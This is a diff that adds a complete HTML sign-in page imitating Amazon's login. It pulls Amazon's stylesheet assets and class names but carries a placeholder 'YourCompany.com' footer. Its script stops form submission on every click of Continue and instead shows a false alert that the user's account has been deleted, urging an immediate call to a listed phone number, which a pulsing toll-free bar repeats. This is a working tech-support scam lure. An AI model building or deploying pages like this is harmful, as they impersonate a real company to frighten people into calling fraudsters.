@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Secure sign-in page for your account">
+  <title dir="ltr">Sign In</title>
+  <!-- Optimize CSS loading with preload and media queries -->
+  <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident" media="all" onload="this.media='all'" as="style">
+  <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51UHGPVbeCL.css_.css?AUIClients/AuthenticationPortalAssets" media="all" onload="this.media='all'" as="style">
+  <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/21EtarfodyL.css?AUIClients/CVFAssets" media="all" onload="this.media='all'" as="style">
+  <style>
+    /* Full-page iframe for challenges (e.g., CAPTCHA) */
+    #aa-challenge-whole-page-iframe {
+      overflow: hidden;
+      opacity: 1.0;
+      position: fixed;
+      top: 0;
+      bottom: 0;
+      right: 0;
+      border: none;
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      z-index: 999999;
+    }
+    /* Ensure responsive design for form */
+    @media (max-width: 600px) {
+      .a-box-inner {
+        padding: 1rem !important;
+      }
+      .a-button-span12 {
+        width: 100%;
+      }
+    }
+    /* Enhanced toll-free bar styling */
+    #toll-free-bar {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: linear-gradient(90deg, #ff4d4d, #ff8c1a);
+      color: #ffffff;
+      text-align: center;
+      padding: 15px;
+      z-index: 1000;
+      font-size: 18px;
+      font-family: 'Arial', sans-serif;
+      font-weight: bold;
+      box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.2);
+      transform: translateY(100%);
+      transition: transform 0.3s ease-in-out;
+    }
+    #toll-free-bar.visible {
+      transform: translateY(0);
+    }
+    #toll-free-bar a {
+      color: #ffffff;
+      text-decoration: underline;
+      transition: color 0.2s ease, text-decoration-thickness 0.2s ease;
+    }
+    #toll-free-bar a:hover {
+      color: #e6e6e6;
+      text-decoration-thickness: 2px;
+    }
+    #toll-free-bar .phone-icon {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      vertical-align: middle;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.24 1.02l-2.2 2.2z"/></svg>') no-repeat center;
+    }
+    #toll-free-bar a.pulse {
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    @media (max-width: 600px) {
+      #toll-free-bar {
+        font-size: 16px;
+        padding: 10px;
+      }
+      #toll-free-bar .phone-icon {
+        width: 18px;
+        height: 18px;
+      }
+    }
+  </style>
+  <!-- Favicon for branding -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+</head>
+
+<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
+  <div id="a-page">
+    <div class="a-section a-padding-medium auth-workflow">
+      <!-- Navigation Bar -->
+      <div class="a-section a-spacing-none auth-navbar">
+        <div class="a-section a-spacing-medium a-text-center">
+          <a class="a-link-nav-icon" tabindex="-1" href="/">
+            <i class="a-icon a-icon-logo" role="img" aria-label="Company Logo"></i>
+          </a>
+        </div>
+      </div>
+
+      <div id="authportal-center-section" class="a-section">
+        <div id="authportal-main-section" class="a-section">
+          <!-- Cookie Warning (Commented out as per original) -->
+          <!--
+          <div class="a-section a-spacing-base auth-pagelet-container">
+            <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite" aria-atomic="true">
+              <div class="a-box-inner a-alert-container">
+                <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4>
+                <i class="a-icon a-icon-alert"></i>
+                <div class="a-alert-content">
+                  <p><a class="a-link-normal" href="/cookies">Learn more</a></p>
+                </div>
+              </div>
+            </div>
+          </div>
+          -->
+
+          <!-- Error Messages -->
+          <div class="a-section a-spacing-base auth-pagelet-container">
+            <div class="a-section">
+              <div id="emptyInputMessage" style="display:none;" class="emptyInputMessage a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
+                <div class="a-box-inner a-alert-container">
+                  <h4 class="a-alert-heading">There was a problem</h4>
+                  <i class="a-icon a-icon-alert"></i>
+                  <div class="a-alert-content">
+                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
+                      <li><span class="a-list-item">
+                        We have deleted your account call our tollfree <a href="tel:+18037624570">+1-803-762-4570</a> Immediately
+                      </span></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+
+              <noscript>
+                <div id="auth-js-alert-box" class="a-box a-alert a-alert-error auth-client-side-message-box a-spacing-base" role="alert">
+                  <div class="a-box-inner a-alert-container">
+                    <i class="a-icon a-icon-alert"></i>
+                    <div class="a-alert-content">
+                      This site requires JavaScript to function correctly. Please enable JavaScript in your browser to continue.
+                    </div>
+                  </div>
+                </div>
+              </noscript>
+            </div>
+          </div>
+
+          <!-- Passkey Error Alert -->
+          <div class="a-section auth-pagelet-container">
+            <div id="passkey-error-alert" class="a-box a-alert a-alert-error aok-hidden" role="alert">
+              <div class="a-box-inner a-alert-container">
+                <h4 class="a-alert-heading">Passkey Error</h4>
+                <i class="a-icon a-icon-alert"></i>
+                <div class="a-alert-content">
+                  <p id="passkey-client-error-message">
+                    Something went wrong. Please sign in another way or follow your device’s instructions.
+                  </p>
+                  <p id="passkey-generic-server-error-message" class="aok-hidden">
+                    Sorry, your passkey isn’t working. There might be a server issue. Try again later or use your password.
+                  </p>
+                  <p id="passkey-server-error-message" class="aok-hidden"></p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Sign-In Form -->
+            <div class="a-section a-spacing-base">
+              <div class="a-section">
+                <form name="signIn" method="POST" novalidate action="/api/signin" class="auth-validate-form auth-real-time-validation a-spacing-none" id="signInForm">
+                  <div class="a-section">
+                    <div class="a-box">
+                      <div class="a-box-inner a-padding-extra-large">
+                        <h1 class="a-spacing-small">Sign In</h1>
+                        <div class="a-row a-spacing-base">
+                          <label for="ap_email" class="a-form-label">Email or mobile phone number</label>
+                          <input type="text" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" aria-describedby="email-desc" aria-required="true" placeholder="Enter your email or phone number" autocomplete="username">
+                          <div id="email-desc" class="a-section a-spacing-mini a-size-small a-color-secondary">
+                            Enter your registered email or mobile phone number.
+                          </div>
+                          <div id="emptyInputMessage2" style="display:none" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">
+                            <div class="a-box-inner a-alert-container">
+                              <i class="a-icon a-icon-alert"></i>
+                              <div class="a-alert-content">Please enter your email or mobile phone number.</div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <div class="a-section">
+                          <button id="continue" type="submit" tabindex="5" class="a-button a-button-span12 a-button-primary">
+                            <span class="a-button-inner">
+                              <span id="continueButton" class="a-button-text">Continue</span>
+                            </span>
+                          </button>
+                          <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+                            By continuing, you agree to our <a href="/conditions">Conditions of Use</a> and <a href="/privacy">Privacy Notice</a>.
+                          </div>
+                        </div>
+
+                        <!-- Need Help Expander -->
+                        <div class="a-section">
+                          <div class="a-row a-expander-container a-expander-inline-container">
+                            <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="#need-help" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle='{"allowLinkDefault":true, "expand_prompt":"", "collapse_prompt":""}'>
+                              <i class="a-icon a-icon-expand"></i>
+                              <span class="a-expander-prompt">Need help?</span>
+                            </a>
+                            <ul class="a-unordered-list a-nostyle a-vertical" id="need-help" style="display:none">
+                              <li><span class="a-list-item">
+                                <a id="auth-fpp-link-bottom" class="a-link-normal" href="/forgot-password">Forgot your password?</a>
+                              </span></li>
+                              <li><span class="a-list-item">
+                                <a id="ap-other-signin-issues-link" class="a-link-normal" href="/signin-issues">Other issues with Sign-In</a>
+                              </span></li>
+                            </ul>
+                          </div>
+                        </div>
+
+                        <!-- Business Account Link -->
+                        <div id="ab-signin-link-section" class="a-section">
+                          <hr aria-hidden="true" class="a-divider-normal">
+                          <div class="a-section a-spacing-micro">
+                            <span class="a-text-bold">Buying for work?</span>
+                          </div>
+                          <a id="ab-sign-in-ingress-link" class="a-link-normal" href="/business">
+                            Shop on Business Account
+                          </a>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </form>
+              </div>
+
+              <!-- Create Account -->
+              <div class="a-divider a-divider-break">
+                <h5 aria-level="5">New to our site?</h5>
+              </div>
+              <a id="auth-create-account-link" href="/signup" class="a-button a-button-span12 a-button-base">
+                <span class="a-button-inner">
+                  <span class="a-button-text">Create your account</span>
+                </span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="a-section a-spacing-top-extra-large auth-footer">
+        <div class="a-divider a-divider-section">
+          <div class="a-divider-inner"></div>
+        </div>
+        <div class="a-section a-spacing-small a-text-center a-size-mini">
+          <a class="a-link-normal" target="_blank" rel="noopener" href="/conditions">Conditions of Use</a>
+          <span class="auth-footer-seperator"> | </span>
+          <a class="a-link-normal" target="_blank" rel="noopener" href="/privacy">Privacy Notice</a>
+          <span class="auth-footer-seperator"> | </span>
+          <a class="a-link-normal" target="_blank" rel="noopener" href="/help">Help</a>
+        </div>
+        <div class="a-section a-spacing-none a-text-center">
+          <span class="a-size-mini a-color-secondary">© 2025, YourCompany.com, Inc. or its affiliates</span>
+        </div>
+      </div>
+
+      <!-- Toll-Free Bar -->
+      <div id="toll-free-bar">
+        <span class="phone-icon"></span>Call our toll-free number: <a href="tel:+18037624570" class="pulse">+1-803-762-4570</a>
+      </div>
+    </div>
+
+    <!-- External JavaScript -->
+    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts=""></div>
+    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
+
+    <!-- JavaScript for form handling -->
+    <script defer>
+      // Button click handling
+      document.getElementById('continue').addEventListener('click', function(event) {
+        event.preventDefault();
+        console.log('Continue button clicked'); // Debug log
+        const emptyInputMessage = document.getElementById('emptyInputMessage');
+        const tollFreeBar = document.getElementById('toll-free-bar');
+        
+        // Display error message and toll-free bar immediately on click
+        emptyInputMessage.style.display = 'block';
+        tollFreeBar.style.display = 'block';
+        tollFreeBar.classList.add('visible');
+        setTimeout(() => {
+          emptyInputMessage.style.display = 'none';
+          tollFreeBar.style.display = 'none';
+          tollFreeBar.classList.remove('visible');
+        }, 4000);
+      });
+
+      // Toggle Need Help section
+      document.querySelector('.a-expander-header').addEventListener('click', function(event) {
+        event.preventDefault();
+        const expanderContent = document.getElementById('need-help');
+        const isExpanded = this.getAttribute('aria-expanded') === 'true';
+        this.setAttribute('aria-expanded', !isExpanded);
+        expanderContent.style.display = isExpanded ? 'none' : 'block';
+      });
+    </script>
+
+    <!-- NoScript Pixel for Analytics -->
+    <noscript>
+      <img height="1" width="1" style="display:none;visibility:hidden;" src="/analytics/noscript" alt="Analytics pixel" />
+    </noscript>
+  </div>
+</body>
+</html>
